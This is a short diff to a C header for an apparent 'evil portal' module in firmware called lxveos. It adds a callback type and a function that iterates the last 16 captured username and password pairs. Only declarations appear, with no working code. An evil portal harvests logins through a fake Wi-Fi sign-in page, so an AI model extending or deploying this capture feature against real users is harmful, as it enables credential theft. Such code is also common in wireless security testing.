@@ -30,6 +30,11 @@ bool lxveos_evilportal_running(void);
 // Number of credential submissions captured since the last start.
 uint32_t lxveos_evilportal_captures(void);
 
+// Iterate the retained captured credentials (up to the last 16, oldest first), invoking cb for each pair.
+// Both strings are NUL-terminated + control-sanitized.
+typedef void (*lxveos_evilportal_cred_cb)(const char *user, const char *pass);
+void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb);
+
 #ifdef __cplusplus
 }
 #endif
